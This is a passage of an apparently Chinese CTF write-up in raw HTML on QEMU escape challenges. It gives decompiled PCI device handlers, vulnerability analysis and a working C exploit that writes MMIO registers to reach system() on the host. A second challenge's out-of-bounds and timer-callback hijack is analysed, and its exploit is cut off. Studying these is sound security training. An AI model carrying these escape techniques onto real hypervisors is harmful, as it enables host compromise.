ppoll+182                &lt;ppoll+182&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7fda04c8bcd6 &lt;ppoll+182&gt;    mov    edi, r9d</span><br><span class="line">   0x7fda04c8bcd9 &lt;ppoll+185&gt;    mov    dword ptr [rsp + 8], eax</span><br><span class="line">   0x7fda04c8bcdd &lt;ppoll+189&gt;    call   __pthread_disable_asynccancel</span><br><span class="line">    &lt;__pthread_disable_asynccancel&gt;</span><br><span class="line"></span><br><span class="line">   0x7fda04c8bce2 &lt;ppoll+194&gt;    mov    eax, dword ptr [rsp + 8]</span><br><span class="line">────────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ rsp     0x7fff06549b70 ◂— 0x0</span><br><span class="line">01:0008│-098     0x7fff06549b78 —▸ 0x5617d5f1f240 ◂— 0x100000000</span><br><span class="line">02:0010│-090     0x7fff06549b80 ◂— 0x5</span><br><span class="line">03:0018│-088     0x7fff06549b88 ◂— 0x0</span><br><span class="line">04:0020│ rdx r13 0x7fff06549b90 ◂— 0x0</span><br><span class="line">05:0028│-078     0x7fff06549b98 ◂— 0x2456cfa</span><br><span class="line">06:0030│-070     0x7fff06549ba0 —▸ 0x7fff06549c10 —▸ 0x7fff06549c40 —▸ 0x7fff06549c90 —▸ 0x7fff06549ca0 ◂— ...</span><br><span class="line">07:0038│-068     0x7fff06549ba8 ◂— 0x1eec99408d27f400</span><br><span class="line">──────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► 0   0x7fda04c8bcce ppoll+174</span><br><span class="line">   1   0x5617d3e3e1bc</span><br><span class="line">   2   0x5617d3e3f1f3</span><br><span class="line">   3   0x5617d3e3f316</span><br><span class="line">   4   0x5617d3a7b4d8</span><br><span class="line">   5   0x5617d3a82a83</span><br><span class="line">   6   0x7fda04b9cd90 __libc_start_call_main+128</span><br><span class="line">   7   0x7fda04b9ce40 __libc_start_main+128</span><br><span class="line">──────────────────────────────[ THREADS (4 TOTAL) ]──────────────────────────────</span><br><span class="line">  ► 1   &quot;qemu-system-x86&quot; stopped: 0x7fda04c8bcce &lt;ppoll+174&gt;</span><br><span class="line">    2   &quot;qemu-system-x86&quot; stopped: 0x7fda04c9188d &lt;syscall+29&gt;</span><br><span class="line">    3   &quot;qemu-system-x86&quot; stopped: 0x7fda04c04117 &lt;__futex_abstimed_wait_cancelable64+231&gt;</span><br><span class="line">    4   &quot;qemu-system-x86&quot; stopped: 0x7fda04c04117 &lt;__futex_abstimed_wait_cancelable64+231&gt;</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"><span class="meta prompt_">pwndbg&gt;</span></span><br></pre></td></tr></table></figure><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="数字经济众测-2019-qemu"><a href="#数字经济众测-2019-qemu" class="headerlink" title="[数字经济众测 2019] qemu"></a>[数字经济众测 2019] qemu</h2><p>由于附件没有给出符号表，于是手动对部分比较重要的函数进行了恢复</p><h3 id="恢复代码"><a href="#恢复代码" class="headerlink" title="恢复代码"></a>恢复代码</h3><h4 id="rfid-class-init"><a href="#rfid-class-init" class="headerlink" title="rfid_class_init"></a>rfid_class_init</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">rfid_class_init</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = sub_70031D(a1, <span class="string">&quot;pci-device&quot;</span>, <span class="string">&quot;/home/wang/qemu/hw/misc/myrfid.c&quot;</span>, <span class="number">369LL</span>, <span class="string">&quot;rfid_class_init&quot;</span>);</span><br><span class="line">  *(_QWORD *)(result + <span class="number">176</span>) = sub_571043;</span><br><span class="line">  *(_QWORD *)(result + <span class="number">184</span>) = <span class="number">0LL</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">208</span>) = <span class="number">1056</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">210</span>) = <span class="number">4919</span>;</span><br><span class="line">  *(_BYTE *)(result + <span class="number">212</span>) = <span class="number">105</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">214</span>) = <span class="number">255</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="rfid-mmio-write"><a href="#rfid-mmio-write" class="headerlink" title="rfid_mmio_write"></a>rfid_mmio_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__fastcall <span class="title function_">rfid_mmio_write</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, __int64 val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *result; <span class="comment">// rax</span></span><br><span class="line">  _DWORD n[<span class="number">3</span>]; <span class="comment">// [rsp+4h] [rbp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = opaque;</span><br><span class="line">  v6 = addr;</span><br><span class="line">  *(_QWORD *)&amp;n[<span class="number">1</span>] = val;</span><br><span class="line">  v11 = opaque;</span><br><span class="line">  v8 = (addr &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">  v9 = (addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">  result = (_BYTE *)((addr &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xF</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( (<span class="type">unsigned</span> __int64)result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0uLL</span>:</span><br><span class="line">      result = byte_122FFE0;</span><br><span class="line">      byte_122FFE0[v9] = <span class="number">119</span>;                   <span class="comment">// w</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1uLL</span>:</span><br><span class="line">      result = byte_122FFE0;</span><br><span class="line">      byte_122FFE0[v9] = <span class="number">115</span>;                   <span class="comment">// s</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2uLL</span>:</span><br><span class="line">      result = byte_122FFE0;</span><br><span class="line">      byte_122FFE0[v9] = <span class="number">97</span>;                    <span class="comment">// a</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3uLL</span>:</span><br><span class="line">      result = byte_122FFE0;</span><br><span class="line">      byte_122FFE0[v9] = <span class="number">100</span>;                   <span class="comment">// d</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4uLL</span>:</span><br><span class="line">      result = byte_122FFE0;</span><br><span class="line">      byte_122FFE0[v9] = <span class="number">65</span>;                    <span class="comment">// A</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5uLL</span>:</span><br><span class="line">      result = byte_122FFE0;</span><br><span class="line">      byte_122FFE0[v9] = <span class="number">66</span>;                    <span class="comment">// B</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6uLL</span>:</span><br><span class="line">      v10 = (<span class="type">unsigned</span> __int16)v6;</span><br><span class="line">      result = <span class="built_in">memcpy</span>(&amp;command[(<span class="type">unsigned</span> __int16)v6], &amp;n[<span class="number">1</span>], size);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="vnln"><a href="#vnln" class="headerlink" title="vnln"></a>vnln</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">vuln</span><span class="params">(__int64 a1, <span class="type">unsigned</span> __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( ((a2 &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xF</span>) != <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(off_10CC100);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;byte_122FFE0, off_10CC100, v2) )<span class="comment">// off_10cc100 = aWwssadadbaba</span></span><br><span class="line">      system(command);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">270438LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>可以看出作者连<code>system</code>都给出来了，真的是为了出题而出题。我看主要看<code>vuln</code>函数，只要另其满足<code>2</code>个字符串相同，即可执行<code>system(commond)</code>，于是我们可以利用<code>rfid_mmio_write</code>函数来使其满足条件，最后执行<code>system(&quot;cat flag&quot;)</code>来完成逃逸</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">char</span>* mmio_mem;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr,<span class="type">uint64_t</span> value)</span>&#123;</span><br><span class="line">      *(<span class="type">uint64_t</span> *)(mmio_mem + addr) = value;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>,<span class="number">0x1000000</span>,PROT_READ | PROT_WRITE, MAP_SHARED, open(<span class="string">&quot;/dev/mem&quot;</span>,<span class="number">2</span>),<span class="number">0xfb000000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)&#123;</span><br><span class="line">        perror(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">0x000000</span>,<span class="number">0</span>);  <span class="comment">//w  </span></span><br><span class="line">    mmio_write(<span class="number">0x010000</span>,<span class="number">0</span>);  <span class="comment">//w  </span></span><br><span class="line">    mmio_write(<span class="number">0x120000</span>,<span class="number">0</span>);  <span class="comment">//s   </span></span><br><span class="line">    mmio_write(<span class="number">0x130000</span>,<span class="number">0</span>);  <span class="comment">//s </span></span><br><span class="line">    mmio_write(<span class="number">0x240000</span>,<span class="number">0</span>);  <span class="comment">//a  </span></span><br><span class="line">    mmio_write(<span class="number">0x350000</span>,<span class="number">0</span>);  <span class="comment">//d </span></span><br><span class="line">    mmio_write(<span class="number">0x260000</span>,<span class="number">0</span>);  <span class="comment">//a </span></span><br><span class="line">    mmio_write(<span class="number">0x370000</span>,<span class="number">0</span>);  <span class="comment">//d  </span></span><br><span class="line">    mmio_write(<span class="number">0x580000</span>,<span class="number">0</span>);  <span class="comment">//B  </span></span><br><span class="line">    mmio_write(<span class="number">0x490000</span>,<span class="number">0</span>);  <span class="comment">//A  </span></span><br><span class="line">    mmio_write(<span class="number">0x5a0000</span>,<span class="number">0</span>);  <span class="comment">//B </span></span><br><span class="line">    mmio_write(<span class="number">0x4b0000</span>,<span class="number">0</span>);  <span class="comment">//A </span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> cmd[<span class="number">0x20</span>] = <span class="string">&quot;cat flag&quot;</span>;</span><br><span class="line">    mmio_write(<span class="number">0x600000</span>,*(<span class="type">uint64_t</span> *)(&amp;cmd[<span class="number">0</span>]));</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">int</span> *)mmio_mem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="湖湘杯-2019-pwn2"><a href="#湖湘杯-2019-pwn2" class="headerlink" title="[湖湘杯 2019] pwn2"></a>[湖湘杯 2019] pwn2</h2><h3 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h3><h4 id="strng-mmio-read"><a href="#strng-mmio-read" class="headerlink" title="strng_mmio_read"></a>strng_mmio_read</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> __cdecl <span class="title function_">strng_mmio_read</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> &amp;&amp; (addr &amp; <span class="number">3</span>) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> opaque-&gt;regs[addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="strng-mmio-write"><a href="#strng-mmio-write" class="headerlink" title="strng_mmio_write"></a>strng_mmio_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">strng_mmio_write</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> seed; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  seed = val;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> &amp;&amp; (addr &amp; <span class="number">3</span>) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;regs[<span class="number">1</span>] = rand();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 == <span class="number">3</span> )</span><br><span class="line">        opaque-&gt;regs[<span class="number">3</span>] = rand_r(&amp;opaque-&gt;regs[<span class="number">2</span>]);</span><br><span class="line">      opaque-&gt;flag = <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;regs[v5] = seed;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      srand(val);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="strng-pmio-read"><a href="#strng-pmio-read" class="headerlink" title="strng_pmio_read"></a>strng_pmio_read</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> __cdecl <span class="title function_">strng_pmio_read</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint64_t</span> v4; <span class="comment">// [rsp+14h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size != <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !addr )</span><br><span class="line">    <span class="keyword">return</span> opaque-&gt;addr;</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (opaque-&gt;addr &amp; <span class="number">3</span>) != <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    <span class="keyword">return</span> opaque-&gt;regs[opaque-&gt;addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="strng-pmio-write"><a href="#strng-pmio-write" class="headerlink" title="strng_pmio_write"></a>strng_pmio_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">strng_pmio_write</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int64_t</span> ms_4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">uint32_t</span> v5; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">4</span> &amp;&amp; (opaque-&gt;addr &amp; <span class="number">3</span>) == <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = opaque-&gt;addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          opaque-&gt;regs[<span class="number">1</span>] = rand();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( v5 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v5 == <span class="number">3</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            opaque-&gt;regs[<span class="number">3</span>] = rand_r(&amp;opaque-&gt;regs[<span class="number">2</span>]);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            opaque-&gt;regs[v5] = val;</span><br><span class="line">            <span class="keyword">if</span> ( opaque-&gt;flag )</span><br><span class="line">            &#123;</span><br><span class="line">              ms_4 = qemu_clock_get_ms_4(QEMU_CLOCK_VIRTUAL_0);</span><br><span class="line">              timer_mod(&amp;opaque-&gt;strng_timer, ms_4 + <span class="number">100</span>);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          srand(val);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;addr = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>通过对上面四个函数的观察，我们可以发现起都可以通过对<code>regs</code>数组进行越界操作，且<code>strng_pmio_write</code>函数中存在<code>timer</code>的函数调用。因此我们可以通过<code>regs</code>数组的越界操作来实现部分地址的读写操作<br>我们首先来看<code>STRNGState</code>结构体（内容来自<code>sky123</code>师傅的博客）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(STRNGState*)<span class="number">0x5555582a59d0</span></span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  pdev = &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;,</span><br><span class="line">  mmio = &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;,</span><br><span class="line">  pmio = &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;,</span><br><span class="line">  addr = <span class="number">276</span>, </span><br><span class="line">  flag = <span class="number">1</span>, </span><br><span class="line">  regs = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1818321784</span>, <span class="number">99</span>, <span class="number">0</span> &lt;repeats <span class="number">58</span> times&gt;&#125;, </span><br><span class="line">  strng_timer = &#123;</span><br><span class="line">    expire_time = <span class="number">-1</span>, </span><br><span class="line">    timer_list = <span class="number">0x555556a71860</span>, </span><br><span class="line">    cb = <span class="number">0x5555557eec8e</span> &lt;strng_timer&gt;, </span><br><span class="line">    opaque = <span class="number">0x5555582a59d0</span>, </span><br><span class="line">    next = <span class="number">0x0</span>, </span><br><span class="line">    scale = <span class="number">1000000</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>opaque</code>中存放的是<code>STRNGState</code>结构体的地址，而<code>cb</code>则存放着<code>qemu-system</code>的地址，于是我们可以通过<code>regs</code>的溢出来进行泄露<br>接下来就是要考虑怎么劫持程序流。注意到前面<code>strng_pmio_write</code>函数中存在<code>timer</code>的函数调用，其<code>timer_mod</code> 函数会将该定时任务时间设置为 <code>ms_4 + 100</code> ，并且将 <code>opaque-&gt;strng_timer</code> 添加到定时任务。于是我们可以将<code>STRNGState</code>结构体中的<code>cb</code>改为<code>system@plt</code>的地址，然后将<code>opaque</code>改为函数参数的地址，即可实现任意函数的执行</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 